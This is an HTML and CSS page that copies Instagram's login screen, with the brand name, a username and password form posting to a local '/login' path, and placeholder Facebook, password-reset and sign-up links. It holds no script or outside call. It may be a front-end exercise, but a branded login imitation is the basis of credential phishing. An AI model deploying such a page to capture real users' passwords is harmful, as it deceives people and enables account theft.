<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login • Instagram</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #fafafa;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      max-width: 350px;
      width: 100%;
    }

    .card {
      background-color: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 40px 30px;
      margin-bottom: 10px;
      text-align: center;
    }

    .logo {
      font-family: 'Brush Script MT', cursive, sans-serif;
      font-size: 40px;
      margin-bottom: 30px;
      letter-spacing: 1px;
      color: #262626;
    }

    .form-group {
      margin-bottom: 8px;
    }

    .form-group input {
      width: 100%;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      padding: 10px 8px;
      font-size: 12px;
      outline: none;
    }

    .form-group input:focus {
      border-color: #a8a8a8;
    }

    .btn-login {
      width: 100%;
      background-color: #0095f6;
      color: #ffffff;
      border: none;
      border-radius: 8px;
      padding: 7px;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
    }

    .btn-login:hover {
      background-color: #1877f2;
    }

    .separator {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
    }

    .separator .line {
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
    }

    .separator span {
      padding: 0 16px;
      font-size: 13px;
      color: #737373;
      font-weight: 600;
    }

    .facebook-login {
      display: flex;
      justify-content: center;
      align-items: center;
      color: #385185;
      font-size: 14px;
      font-weight: 600;
      text-decoration: none;
      margin-bottom: 16px;
    }

    .facebook-login:hover {
      text-decoration: underline;
    }

    .forgot-link {
      display: block;
      font-size: 12px;
      color: #00376b;
      text-decoration: none;
      margin-top: 12px;
    }

    .forgot-link:hover {
      text-decoration: underline;
    }

    .signup-card {
      background-color: #ffffff;
      border: 1px solid #dbdbdb;
      border-radius: 1px;
      padding: 20px;
      text-align: center;
      font-size: 14px;
    }

    .signup-card a {
      color: #0095f6;
      text-decoration: none;
      font-weight: 600;
    }

    .signup-card a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="container">
    <!-- Main Login Card -->
    <div class="card">
      <h1 class="logo">Instagram</h1>

      <form action="/login" method="POST">
        <div class="form-group">
          <input 
            type="text" 
            name="identifier" 
            placeholder="Phone number, username, or email" 
            required 
            autocomplete="username"
          >
        </div>
        <div class="form-group">
          <input 
            type="password" 
            name="password" 
            placeholder="Password" 
            required 
            autocomplete="current-password"
          >
        </div>
        <button type="submit" class="btn-login">Log In</button>
      </form>

      <div class="separator">
        <div class="line"></div>
        <span>OR</span>
        <div class="line"></div>
      </div>

      <a href="#" class="facebook-login">Log in with Facebook</a>
      <a href="#" class="forgot-link">Forgot password?</a>
    </div>

    <!-- Sign-up Prompt Card -->
    <div class="signup-card">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </div>

</body>
</html>
